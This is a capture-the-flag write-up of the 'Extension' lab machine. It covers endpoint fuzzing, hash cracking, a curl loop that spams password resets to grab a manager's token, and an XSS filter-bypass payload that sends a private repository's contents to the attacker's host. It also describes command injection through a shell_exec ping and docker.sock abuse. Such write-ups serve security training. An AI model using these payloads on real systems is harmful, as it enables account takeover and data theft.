# Extension!
## @Author : M3tr1c_r00t
![Extension](https://user-images.githubusercontent.com/99975622/228443628-3ec5d554-e406-41b9-b68b-6cc466d0c89c.png)
Extension is a hard linux box that is vulnerable to a 'spam attack' which we can use to reset creds to a user and gain privildge access on the web-server. Afterwards, we get to execute an xss using a custom extension which we have to install onto our browsers and gain access to restricted files on a repository for foothold. For Priv esc, we get to abuse the docker.sock file found on a docker container and mounting the hosts file system onto the docker.
### Enumeration
#### Nmap
```
# Nmap 7.80 scan initiated Wed Mar 22 23:17:47 2023 as: nmap -sC -sV -A -p 22,80 -oN nmapports.txt 10.10.11.171
Nmap scan report for 10.10.11.171
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 (RSA)
|   256 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c (ECDSA)
|_  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: snippet.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   308.27 ms 10.10.14.1
2   309.62 ms 10.10.11.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 22 23:18:08 2023 -- 1 IP address (1 host up) scanned in 22.01 seconds
```

#### Dirsearch
```
# Dirsearch started Wed Mar 22 23:30:19 2023 as: dirsearch.py -w /usr/share/wordlists/dirb/common.txt -u http://snippet.htb -e php,txt,html,css,js -o /home/m3tr1c/Desktop/Extension/dsearch.txt

301   308B   http://snippet.htb:80/css    -> REDIRECTS TO: http://snippet.htb/css/
302   342B   http://snippet.htb:80/dashboard    -> REDIRECTS TO: http://snippet.htb/login
200     0B   http://snippet.htb:80/favicon.ico
200    37KB  http://snippet.htb:80/forgot-password
301   311B   http://snippet.htb:80/images    -> REDIRECTS TO: http://snippet.htb/images/
200    37KB  http://snippet.htb:80/index.php
301   307B   http://snippet.htb:80/js    -> REDIRECTS TO: http://snippet.htb/js/
405   825B   http://snippet.htb:80/logout
200    37KB  http://snippet.htb:80/login
302   342B   http://snippet.htb:80/new    -> REDIRECTS TO: http://snippet.htb/login
200    37KB  http://snippet.htb:80/register
403   276B   http://snippet.htb:80/server-status
302   342B   http://snippet.htb:80/snippets    -> REDIRECTS TO: http://snippet.htb/login
302   342B   http://snippet.htb:80/users    -> REDIRECTS TO: http://snippet.htb/login
200     1KB  http://snippet.htb:80/web.config
```
Since there is a web-server, we can check it out.
![Screenshot from 2023-03-22 23-26-05](https://user-images.githubusercontent.com/99975622/228446013-ff52631e-83a4-4eb4-bbcf-09b5836c6f8b.png)
 If we check the source code of the website, we are able to know that the system is running laravel and php.
 ![Screenshot from 2023-03-22 23-36-30](https://user-images.githubusercontent.com/99975622/228446594-2862b82b-8bb2-4023-8b42-1e647f4cf191.png)
On further recon, we find some js data on the source code.
![Screenshot from 2023-03-22 23-37-24](https://user-images.githubusercontent.com/99975622/228447194-6c4ba0d7-e12a-4c5b-9a40-f8973b09ee83.png)
If we further beautify our code, we get some routes and the http method's we can use with them.
![Screenshot from 2023-03-22 23-38-17](https://user-images.githubusercontent.com/99975622/228447248-11223013-79a2-4ac3-af1f-58a8d20b2771.png)
One interesting one was ```/management/dump```
![Screenshot from 2023-03-22 23-45-26](https://user-images.githubusercontent.com/99975622/228447722-85b92b9e-3ea2-4f69-ae4d-ca7bf8ea3e79.png)
If we just send a post request, we get a 419 status meaning probably some headers were mandatory and are clearly missing.

We can try interacting with the login endpoint and we find an SSRF token and a session token.
![Screenshot from 2023-03-22 23-47-40](https://user-images.githubusercontent.com/99975622/228448587-6039ac43-1d4d-4bad-b45c-a1ad93c3ca85.png)
We can try and use this headers and we get a different response, needing some parameters.
![Screenshot from 2023-03-22 23-48-08](https://user-images.githubusercontent.com/99975622/228448882-49fa354a-3007-4054-8d11-dcc9aaa2258d.png)
For this part, we can use ffuf and fuzz for the parameter which is needed by the post request.

So, we can first of all save the request as a file.
![Screenshot from 2023-03-22 23-49-36](https://user-images.githubusercontent.com/99975622/228449226-d159e556-07b4-420b-bb48-ddf482550815.png)

We can then edit the file as below:
```
POST /management/dump HTTP/1.1
Host: snippet.htb
Content-Length: 27
Accept: text/html, application/xhtml+xml
X-XSRF-TOKEN: eyJpdiI6Ilo4dEk2NlRSY25qaUR3ampPbG5WalE9PSIsInZhbHVlIjoiOHdScndacEtlNFhTU1NSTzdib3p4WlJBVWdwVXEvRjhGdmdIRTd2K01oWWJrVXBXTGNOdENhei9GdTdlellza3ZpRkh6VWJINnE4MGNVVzlDdGNWd3ppU1gvSWhqZmRHOCt6UkoyTWNpb2RpQnFWd1VsWWF3RGZ6Z3NFQWdZdDMiLCJtYWMiOiJjNzNlNzZkZjAxNzAxMDcxODg0YWIzYjA1OWMxYTdkMmNhYjJiYTA0Nzg1ZDIwOWM2YmE0OWVlMzg4MWM0YzdjIiwidGFnIjoiIn0=
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-Requested-With: XMLHttpRequest
X-Inertia: true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/json
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Origin: http://snippet.htb
Referer: http://snippet.htb/login
Accept-Encoding: gzip, deflate
Cookie: XSRF-TOKEN=eyJpdiI6Ilo4dEk2NlRSY25qaUR3ampPbG5WalE9PSIsInZhbHVlIjoiOHdScndacEtlNFhTU1NSTzdib3p4WlJBVWdwVXEvRjhGdmdIRTd2K01oWWJrVXBXTGNOdENhei9GdTdlellza3ZpRkh6VWJINnE4MGNVVzlDdGNWd3ppU1gvSWhqZmRHOCt6UkoyTWNpb2RpQnFWd1VsWWF3RGZ6Z3NFQWdZdDMiLCJtYWMiOiJjNzNlNzZkZjAxNzAxMDcxODg0YWIzYjA1OWMxYTdkMmNhYjJiYTA0Nzg1ZDIwOWM2YmE0OWVlMzg4MWM0YzdjIiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6InRtZEJNN1I5YW9OSUVPS1RZMU1nWEE9PSIsInZhbHVlIjoiL3hqMncrc2h2M1YwWGNBazVuamFKNk9lWnlqclVqeEcrRXVqcktoeS9neERJbFRjTVo1T0lGSitZVER3YlgxNkRHdWxWVDJCcmxFejBJdkV0cGp4UG9uQ0laekVkTW8veVdPZzJnQlRFL0JnRWVPRCt3UzNkVmtlZUZwQmdCbHAiLCJtYWMiOiJiMDNlNWNiOTNlMjYwZGY5MWM1MmU2NDQyZDNhNzBmNGVlZTBmZjJmMjAyYzVjOTI3MDJjYTI5NGY1ZGZiZmFlIiwidGFnIjoiIn0%3D
Connection: close

{"FUZZ":"tester@tester.com"}

```
And we find one parameter.
![Screenshot from 2023-03-22 23-58-41](https://user-images.githubusercontent.com/99975622/228450367-3f1df724-78b5-40df-a93d-c6cf2a17b3c5.png)

Next up, we can try and fuzz for its endpoints.
```
POST /management/dump HTTP/1.1
Host: snippet.htb
Content-Length: 27
Accept: text/html, application/xhtml+xml
X-XSRF-TOKEN: eyJpdiI6Ilo4dEk2NlRSY25qaUR3ampPbG5WalE9PSIsInZhbHVlIjoiOHdScndacEtlNFhTU1NSTzdib3p4WlJBVWdwVXEvRjhGdmdIRTd2K01oWWJrVXBXTGNOdENhei9GdTdlellza3ZpRkh6VWJINnE4MGNVVzlDdGNWd3ppU1gvSWhqZmRHOCt6UkoyTWNpb2RpQnFWd1VsWWF3RGZ6Z3NFQWdZdDMiLCJtYWMiOiJjNzNlNzZkZjAxNzAxMDcxODg0YWIzYjA1OWMxYTdkMmNhYjJiYTA0Nzg1ZDIwOWM2YmE0OWVlMzg4MWM0YzdjIiwidGFnIjoiIn0=
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-Requested-With: XMLHttpRequest
X-Inertia: true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/json
Sec-GPC: 1
Accept-Language: en-US,en;q=0.8
Origin: http://snippet.htb
Referer: http://snippet.htb/login
Accept-Encoding: gzip, deflate
Cookie: XSRF-TOKEN=eyJpdiI6Ilo4dEk2NlRSY25qaUR3ampPbG5WalE9PSIsInZhbHVlIjoiOHdScndacEtlNFhTU1NSTzdib3p4WlJBVWdwVXEvRjhGdmdIRTd2K01oWWJrVXBXTGNOdENhei9GdTdlellza3ZpRkh6VWJINnE4MGNVVzlDdGNWd3ppU1gvSWhqZmRHOCt6UkoyTWNpb2RpQnFWd1VsWWF3RGZ6Z3NFQWdZdDMiLCJtYWMiOiJjNzNlNzZkZjAxNzAxMDcxODg0YWIzYjA1OWMxYTdkMmNhYjJiYTA0Nzg1ZDIwOWM2YmE0OWVlMzg4MWM0YzdjIiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6InRtZEJNN1I5YW9OSUVPS1RZMU1nWEE9PSIsInZhbHVlIjoiL3hqMncrc2h2M1YwWGNBazVuamFKNk9lWnlqclVqeEcrRXVqcktoeS9neERJbFRjTVo1T0lGSitZVER3YlgxNkRHdWxWVDJCcmxFejBJdkV0cGp4UG9uQ0laekVkTW8veVdPZzJnQlRFL0JnRWVPRCt3UzNkVmtlZUZwQmdCbHAiLCJtYWMiOiJiMDNlNWNiOTNlMjYwZGY5MWM1MmU2NDQyZDNhNzBmNGVlZTBmZjJmMjAyYzVjOTI3MDJjYTI5NGY1ZGZiZmFlIiwidGFnIjoiIn0%3D
Connection: close

{"download":"FUZZ"}
```
And we find 2, users and profiles.

![Screenshot from 2023-03-23 00-04-48](https://user-images.githubusercontent.com/99975622/228450630-40344383-76e6-478d-ba39-745f67375a11.png)
The profiles endpoint doesn't have anything.
![Screenshot from 2023-03-23 00-22-06](https://user-images.githubusercontent.com/99975622/228450870-0b6caf48-326f-46f3-acf4-35d30979bdaa.png)
But the users has usernames, emails and passwords.
![Screenshot from 2023-03-23 00-05-11](https://user-images.githubusercontent.com/99975622/228451092-491bcc85-c547-414f-ba10-e8ba97e045c1.png)
We can save the data in a file and view it using ```jq``` for proper json formatting.
![Screenshot from 2023-03-23 00-07-13](https://user-images.githubusercontent.com/99975622/228451343-8491a2a2-ad51-4348-a320-1476f443fba3.png)
For this,we can use jq and only get the password hashes and usernames and try to crack them.
![Screenshot from 2023-03-23 00-12-43](https://user-images.githubusercontent.com/99975622/228451667-62518a63-5266-4b68-b0c0-c4077fe3180c.png)
I'm gonna use hashcat and we get at least one password crack.
![Screenshot from 2023-03-23 09-36-03](https://user-images.githubusercontent.com/99975622/228451939-9f17a0d1-b001-4319-acf9-015342bddd5c.png)
The pass:password123
![Screenshot from 2023-03-23 09-36-15](https://user-images.githubusercontent.com/99975622/228452485-45603e5f-b74b-4c5b-ba66-c41d03283510.png)
And we find a couple of users with this pass.
![Screenshot from 2023-03-23 09-38-04](https://user-images.githubusercontent.com/99975622/228452727-c86166d3-a66b-419d-9806-4ba64147bee1.png)
One thing i noted, is that at the beginning of the data file, we find a unique user.
![Screenshot from 2023-03-23 09-54-27](https://user-images.githubusercontent.com/99975622/228452950-9e9e528b-31d8-4fa7-a0f2-4aa037cefd18.png)
With that in mind, we can continue.
We can then login as one of the users onto the site.
![Screenshot from 2023-03-23 09-44-07](https://user-images.githubusercontent.com/99975622/228453331-0665c5e9-85ad-44b2-b628-aabe8d168ad6.png)
On the site settings, there is a snippet section but there isnt an IDOR we can use with our current user.
![Screenshot from 2023-03-23 09-44-30](https://user-images.githubusercontent.com/99975622/228453519-fefc1c18-8e9c-4db1-ace6-e29b09cb1481.png)

My guess, is that we need to gain access as the manager and we can view the other snippets.

Well, since there wasnt any much data on the site, i did a sub-domain brute force and found 2.
![Screenshot from 2023-03-22 23-29-00](https://user-images.githubusercontent.com/99975622/228454257-4f5bfebd-a230-4e33-b090-d696ab415d0a.png)
We can try using the ```mail``` sub-domain and get access.
![Screenshot from 2023-03-23 09-45-41](https://user-images.githubusercontent.com/99975622/228454588-923e92d7-3cf7-41c8-8589-8e184e8ffb44.png)
And it works.
![Screenshot from 2023-03-23 09-45-47](https://user-images.githubusercontent.com/99975622/228454641-7c50a594-7246-48fa-8d5d-6fac7eb4736a.png)
Well, since there was a password-forgot endpoint on the web-server,we can try and see if we can use a password-forgot attack.
![Screenshot from 2023-03-23 09-48-38](https://user-images.githubusercontent.com/99975622/228455049-0dd9d966-1b97-426f-b9a7-4591784325ed.png)
And we get a response on the mail.
![Screenshot from 2023-03-23 09-49-02](https://user-images.githubusercontent.com/99975622/228455236-274390f9-37e0-4d40-881d-c05531269ace.png)
With this, we can actually try and spam the server for password-requests and try to get access to one of the manager's user's token for access.
![Screenshot from 2023-03-23 09-49-24](https://user-images.githubusercontent.com/99975622/228455721-c46260dc-c301-4f61-b36f-f21c564767a0.png)

If you keenly look at the reset tokens, only the last 3 digits are changing.
![Screenshot from 2023-03-23 09-49-34](https://user-images.githubusercontent.com/99975622/228455970-84d72bea-a67c-47b4-bb58-5c27b78c0eff.png)
And this...

![Screenshot from 2023-03-23 09-49-40](https://user-images.githubusercontent.com/99975622/228455993-b6bbf6c2-ce4d-4d34-9f17-0e65690c5f3a.png)
With this information, we actually try and figure out how the hashing was done.
Since the token seems to be md5, maybe it was made using the user's info. We can try and use md5sum to figure this out.
![Screenshot from 2023-03-23 10-08-08](https://user-images.githubusercontent.com/99975622/228458092-3e587cf1-3f03-422a-84d9-07d225258f71.png)

So, it seems that the email is being hashed into md5sum and 3 random digits are appended to it to get the reset token.
![Screenshot from 2023-03-23 10-35-44](https://user-images.githubusercontent.com/99975622/228458971-3ddd1a70-257c-4e9f-acef-0ee942bdc376.png)

We can try to brute force the token, but there is a timeout feature.
![Screenshot from 2023-03-23 10-15-16](https://user-images.githubusercontent.com/99975622/228458529-e0439054-99cd-474a-8bb5-4507e4d6e1ae.png)
Instead of bruteforcing the token, we can actually send out a lot of request tokens are try to guess one of them.

For this,we can use a script.
```
#!/bin/bash

for i in $(seq 1 500);do curl 'http://snippet.htb/forgot-password' \
  -H 'Accept: text/html, application/xhtml+xml' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: XSRF-TOKEN=eyJpdiI6Im1jZ1IwQVdENGdtLzJ4MUMrWXNsZEE9PSIsInZhbHVlIjoicVVGVnY2RHF5V0lqcE5pUHBZLyt6ZzFXQ043Sk1aRGZEV0daRlFzWmQ0QnEwa2tKVFM4d2txc1o2Qng1MnIyV1lUVGRibWZma1dmNFNJdDE5VjBEeGZ2RlZMVytmTzJNNTY5alRLUUc1QUV3bi8xWGlEbTkyVUVtMzIrQ2ZQcS8iLCJtYWMiOiIwN2RhY2I5ODEzMDg5NzBlMTJiMTNjNDNlNjBmNTI2ODE1Y2VlMjlkM2Y1MWJlMTg5NDRmZDIyNTg3MWQwOWRmIiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6InN1YUwwYncrWUFKV2o0djJvZnJOd0E9PSIsInZhbHVlIjoibEdTOGR4b0UrOUNXdzZ6SVkxNUFNU21YcnRDRzB1WWVKaFJlTU5UZkx3NlpXVWNNaDJ0ZkE3V3NLQUdUTU5PSi9NbXZNMlNuVHQ1WWtBTnNSWEs2dXk4VmxlM1VoZjc3U1oxWE4rdnhmN3ZBUDJXWk9VNTdTYmh0K1cvb0VEODAiLCJtYWMiOiJiMjQzZmU5NTk1ZGFhMTc2ZDhlZjYwMzBlYTQwYTc4OGFjYzIzNTc5MTU3MGYwZDQzNTkyMDcwMjk0YzI4YTRiIiwidGFnIjoiIn0%3D' \
  -H 'Origin: http://snippet.htb' \
  -H 'Referer: http://snippet.htb/forgot-password' \
  -H 'Sec-GPC: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
  -H 'X-Inertia: true' \
  -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'X-XSRF-TOKEN: eyJpdiI6Im1jZ1IwQVdENGdtLzJ4MUMrWXNsZEE9PSIsInZhbHVlIjoicVVGVnY2RHF5V0lqcE5pUHBZLyt6ZzFXQ043Sk1aRGZEV0daRlFzWmQ0QnEwa2tKVFM4d2txc1o2Qng1MnIyV1lUVGRibWZma1dmNFNJdDE5VjBEeGZ2RlZMVytmTzJNNTY5alRLUUc1QUV3bi8xWGlEbTkyVUVtMzIrQ2ZQcS8iLCJtYWMiOiIwN2RhY2I5ODEzMDg5NzBlMTJiMTNjNDNlNjBmNTI2ODE1Y2VlMjlkM2Y1MWJlMTg5NDRmZDIyNTg3MWQwOWRmIiwidGFnIjoiIn0=' \
  --data-raw '{"email":"charlie@snippet.htb"}' \
  --compressed \
  --insecure; done

```
And we get it.
![Screenshot from 2023-03-23 10-36-00](https://user-images.githubusercontent.com/99975622/228459353-1fc78f1d-3cb3-41b1-97fc-081ed10afd75.png)
We can then login as the manager charlie and look at the snippets.
We get some creds to the dev sub-domain which we can use.
![Screenshot from 2023-03-23 10-37-00](https://user-images.githubusercontent.com/99975622/228459765-acdcb1aa-21d5-4638-bd71-2a07e3ede259.png)
Base64 decode this and we get the creds.
![Screenshot from 2023-03-23 10-37-31](https://user-images.githubusercontent.com/99975622/228460069-467e90e0-37f0-4e50-967d-9385eb342a5f.png)
And if we login,we get access to gitea. 
![Screenshot from 2023-03-23 10-39-22](https://user-images.githubusercontent.com/99975622/228460305-4eea0768-2350-414b-a3f0-353f89e2a63c.png)

##### What is gitea?
Gitea is a self-hosted Git service that is similar to GitHub or GitLab. It is a web-based Git repository manager that provides an interface for managing Git repositories, users, organizations, and access control. Gitea is an open-source project that can be installed on your own server or cloud instance, allowing you to have complete control over your code.

Gitea provides a simple and intuitive interface for managing Git repositories, and it includes features like issue tracking, pull requests, wiki pages, and more. It also supports webhooks, which allow you to integrate Gitea with other tools and services, and it has a plugin system that makes it easy to extend its functionality.

After logging in, we see that we have access to a repository.(But we can't really see the actual one's)
![Screenshot from 2023-03-23 10-40-17](https://user-images.githubusercontent.com/99975622/228460584-ed7ede03-47ec-41ab-8d92-b60e291fae1a.png)
We can install the extension on our browser and interact with it.
![Screenshot from 2023-03-23 11-15-02](https://user-images.githubusercontent.com/99975622/228460971-fe432636-0917-4564-8b9f-187ae5357ce7.png)
And done.
![Screenshot from 2023-03-23 11-15-10](https://user-images.githubusercontent.com/99975622/228461064-d954b695-d9a5-4887-a9d0-b9e6806cb894.png)
After creating an issue, the extension seems to directly append the issue content onto the web-page.

```
const list = document.getElementsByClassName("issue list")[0];

const log = console.log

if (!list) {
    log("No gitea page..")
} else {

    const elements = list.querySelectorAll("li");

    elements.forEach((item, index) => {

        const link = item.getElementsByClassName("title")[0]

        const url = link.protocol + "//" + link.hostname + "/api/v1/repos" + link.pathname

        log("Previewing %s", url)

        fetch(url).then(response => response.json())
            .then(data => {
                let issueBody = data.body;

                const limit = 500;
                if (issueBody.length > limit) {
                    issueBody = issueBody.substr(0, limit) + "..."
                }

                issueBody = ": " + issueBody

                issueBody = check(issueBody)

                const desc = item.getElementsByClassName("desc issue-item-bottom-row df ac fw my-1")[0]

                desc.innerHTML += issueBody

            });

    });
}

/**
 * @param str
 * @returns {string|*}
 */
function check(str) {

    // remove tags
    str = str.replace(/<.*?>/, "")

    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]

    for (const i of filter) {
        if (str.includes(i))
            return ""
    }

    return str

}

```
#### what the code does.
- This line of code selects an HTML element with class name "issue list" and assigns it to a constant variable list. The [0] at the end indicates that we want to select the first element with this class name.
- The second line assigns the console.log function to a variable named "log" for convenience.
The if statement on lines 4-7 checks if the "list" variable is null. If it is, the function logs "No gitea page.." to the console and exits.
- If the "list" variable is not null, the code continues by selecting all the "li" elements inside the "list" element and assigning them to a variable named "elements" using the "querySelectorAll" method.
- The "forEach" method is called on the "elements" array to iterate over each issue item.
- Inside the forEach loop, the code extracts the issue link URL, generates the API URL, and fetches the data using the "fetch" method.
- The check() function is then called with the issue body string as an argument, which removes any HTML tags and filters out any characters that are not allowed in the issue description (semicolon, single quotes, parentheses, etc.). Finally, the issue description is added to the corresponding list item on the page.
- The check() function is a helper function that takes a string as an argument and returns a filtered version of that string. It removes any HTML tags and filters out certain characters that are not allowed in the issue description according to the filter array. If the filtered string contains any of the filtered characters, it returns an empty string, otherwise it returns the original string.

This creates a vulnerability for cross site scripting(XSS).
Even though the extension seems to be doing some kind of filtering, we can actually bypass this by using casing. This is because html is not case sensitive.

#### Bypassing...
![Screenshot from 2023-03-23 12-21-23](https://user-images.githubusercontent.com/99975622/228463270-46956454-c029-45ad-9593-32fa9f6ce92f.png)

We can actually see the repositories that we have access to.
![Screenshot from 2023-03-23 12-25-34](https://user-images.githubusercontent.com/99975622/228463554-e32f6769-e271-4824-8477-dcb02e520cca.png)

Since we already have a good idea of how to bypass this, we can use the below payload.
```
fetch("http://dev.snippet.htb/api/v1/repos/charlie/backups/contents")
.then(response => response.json())
.then(data=>fetch("http://10.10.14.246:8000/"+btoa(JSON.stringify(data)))); 

```
We can use this payload to try and access the internal server's repos and get  information on them.
Xss
```
<><img sRc=x
onerror=eval.call`${"eval\x28atob`BASE64_PAYLOAD`\x29"}`>

```

We can then set up a listener and listen for the base64 response.

![Screenshot from 2023-03-23 12-36-56](https://user-images.githubusercontent.com/99975622/228466310-e65d4044-8663-40e8-ac2c-8622c6475596.png)
If we base64 decode it;
![Screenshot from 2023-03-23 12-39-19](https://user-images.githubusercontent.com/99975622/228466361-273cb00d-0ea1-4f08-af60-8dffd4094531.png)
We can see we have access to charlie's backups repository.
With that,we can send a payload to get the repository as base64 and we get the base64 encoded file.
![Screenshot from 2023-03-23 12-43-02](https://user-images.githubusercontent.com/99975622/228466856-4a90918a-d99d-4a2f-b9c6-bbfd6f22d53e.png)
The response.
![Screenshot from 2023-03-23 13-07-11](https://user-images.githubusercontent.com/99975622/228467310-fc690dff-d095-4ed5-8c4c-32bb07048019.png)
We can then grab the file contents which are base64 encoded.
![Screenshot from 2023-03-23 13-07-51](https://user-images.githubusercontent.com/99975622/228467420-54ee5513-795c-4cdc-8412-a36bbb896f81.png)
![Screenshot from 2023-03-23 13-09-28](https://user-images.githubusercontent.com/99975622/228467644-5e6a3fbf-7628-42d0-925e-f8d11f81301a.png)
If we decompress the zip file, we get an ssh key.
![Screenshot from 2023-03-23 13-10-01](https://user-images.githubusercontent.com/99975622/228468672-fd3e4e93-42e8-4fb1-afc7-cbcbc8fa70dc.png)
We can use the file and login as charlie onto the machine.
![Screenshot from 2023-03-23 13-13-30](https://user-images.githubusercontent.com/99975622/228470247-3a533471-9120-4f7e-9483-f4ff1e3ad195.png)
After gaining access into the system as the charlie user, I navigated around and found the user flag was in the jean user but we didnt have access to it.
![Screenshot from 2023-03-23 13-13-43](https://user-images.githubusercontent.com/99975622/228471209-c03e65bc-5a49-4154-992f-7f3557c5c834.png)
There was a file called .git-credentials which had the same credentials to gitea.
![Screenshot from 2023-03-23 13-15-55](https://user-images.githubusercontent.com/99975622/228472213-c415f3ca-daa1-4c2a-a89c-93d7f7c04aaa.png)
We can try to use this to switch to the jean user and it works. 
We can then get the user flag.
![Screenshot from 2023-03-23 13-14-20](https://user-images.githubusercontent.com/99975622/228472445-f640f54a-d9f6-44a9-8263-60a5a9b824f7.png)

### User to root
In Jean's home directory, we can see that there is a folder called projects and in it is a laravel-framework source code to the running web service.

![Screenshot from 2023-03-23 15-08-12](https://user-images.githubusercontent.com/99975622/228659708-e2159578-9870-4d91-8825-8ad7a59fcd20.png)

Since the directory is too large to analyze, i zipped it and we can transfer it into our machine.
![Screenshot from 2023-03-23 15-09-09](https://user-images.githubusercontent.com/99975622/228660362-0693970a-0002-48cc-aaaa-4f410733957c.png)

After transferring it onto my machine, we can try and search for possible system functions on the system which we can use to get Code execution.

If we search for the word shell on subl in the directory, we see the shell_exec function appearing on the admincontroller.php page.
![Screenshot from 2023-03-23 19-00-20](https://user-images.githubusercontent.com/99975622/228662052-bc92ecd0-382c-4438-9d58-5d8609a28dad.png)

We can now look at the source code.
![Screenshot from 2023-03-23 19-00-30](https://user-images.githubusercontent.com/99975622/228662121-18c6a57c-234a-4774-8088-861b33479c7f.png)
__Source code...__
```
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Validation\ValidationException;

class AdminController extends Controller
{

    /**
     * @throws ValidationException
     */
    public function validateEmail(Request $request)
    {
        $sec = env('APP_SECRET');

        $email = urldecode($request->post('email'));
        $given = $request->post('cs');
        $actual = hash("sha256", $sec . $email);

        $array = explode("@", $email);
        $domain = end($array);

        error_log("email:" . $email);
        error_log("emailtrim:" . str_replace("\0", "", $email));
        error_log("domain:" . $domain);
        error_log("sec:" . $sec);
        error_log("given:" . $given);
        error_log("actual:" . $actual);

        if ($given !== $actual) {
            throw ValidationException::withMessages([
                'email' => "Invalid signature!",
            ]);
        } else {
            $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
            return Redirect::back()->with('message', trim($res));
        }

    }
}

```
#### Code explanation...
 The purpose of this class is to validate an email address using a signature that is generated using the application's secret key.

The validateEmail() method is used to validate the email address submitted through an HTTP POST request. The method first retrieves the application's secret key using the env() function, which reads the value of the APP_SECRET environment variable.

The email address is then retrieved from the HTTP POST request using the post() method of the $request object, and decoded using the urldecode() function. The method then generates a signature using the SHA256 hashing algorithm, which is a combination of the application's secret key and the email address. The generated signature is compared to the signature provided in the HTTP POST request.

If the provided signature matches the generated signature, the method executes a shell command to ping the domain part of the email address to check if the email is valid. The result of the command is then returned to the user in a message. If the provided signature does not match the generated signature, a ValidationException is thrown with an error message stating that the signature is invalid.

If we look at the /var/www/folder, we find the creds to the sql database.

Since the php validate email class is probably going to get and do a validation from the data on the database, we can actually tamper with it and change the email to get command execution on the shell_exec function.

To do this, we need to do a port forwarding for the internal mysql server so as to connect to it.
We can use ssh since we already have the rsa key.
![Screenshot from 2023-03-23 22-47-48](https://user-images.githubusercontent.com/99975622/228668111-b4e7f3d3-5a28-4267-8a00-04020dd3d97f.png)

We can now connect to the database.
![Screenshot from 2023-03-23 22-50-11](https://user-images.githubusercontent.com/99975622/228668408-10c243e9-0723-480a-9865-3baa930cabc7.png)

The users data is in the webapp database in the users table.

We can try and manipulate the email of the first user in the validate list for simplicity.
![Screenshot from 2023-03-23 22-59-22](https://user-images.githubusercontent.com/99975622/228668725-d666ce05-418c-4a15-9a6a-2030ffd78b13.png)
We can then set up an extra ping to ping us.
![Screenshot from 2023-03-23 23-04-19](https://user-images.githubusercontent.com/99975622/228668834-12cb36a3-7ac4-4cd2-8f8f-6fc31a56535f.png)
If we reload the page, we can see the email changed.
![Screenshot from 2023-03-23 23-06-24](https://user-images.githubusercontent.com/99975622/228669046-7bc81deb-98a3-4ca2-9854-83b438ad991b.png)
We can set up tcpdump and we get our connection back.
![Screenshot from 2023-03-23 23-11-39](https://user-images.githubusercontent.com/99975622/228669337-68bb6e71-310e-486e-a965-6050c5929e41.png)
With the sanity check in place, we can actually place our reverse bash shell script in place.
![Screenshot from 2023-03-23 23-13-54](https://user-images.githubusercontent.com/99975622/228669790-ae14b737-b833-451e-88dc-9f801db4df40.png)
Execute it and we get a shell.
![Screenshot from 2023-03-23 23-14-38](https://user-images.githubusercontent.com/99975622/228670054-8488253f-73df-4c48-9c25-17387be63d40.png)

After stabilizing our shell, we  dont get access to the root user but instead to a docker container.

If we move a couple of steps back and list the directory contents, we get a wierd directory call app.
![Screenshot from 2023-03-23 23-16-51](https://user-images.githubusercontent.com/99975622/228670179-639885a2-46c3-40ef-a1ed-e9a4a44d2c7d.png)
And in it, we find a docker.sock file.
#### What is the docker.sock file?
The docker.sock file is a Unix socket file that is used by the Docker daemon to communicate with the daemon from within a container.

The docker.sock file is also used to manage access control to the Docker daemon. By default, only users who are members of the docker group can access the Unix socket file. This means that users who are not members of the docker group cannot interact with the Docker daemon.

Additionally, the docker.sock file can be used to share data between containers. When two or more containers are connected to the same Docker daemon through the docker.sock file, they can share data and communicate with each other.
__Resources__
```
https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
https://dreamlab.net/en/blog/post/abusing-dockersock-exposure/
```
#### Why is exposing this file dangerous?
Exposing the docker.sock file can be dangerous because it allows unrestricted access to the Docker daemon, which can potentially compromise the security of the host system and any containers running on it.

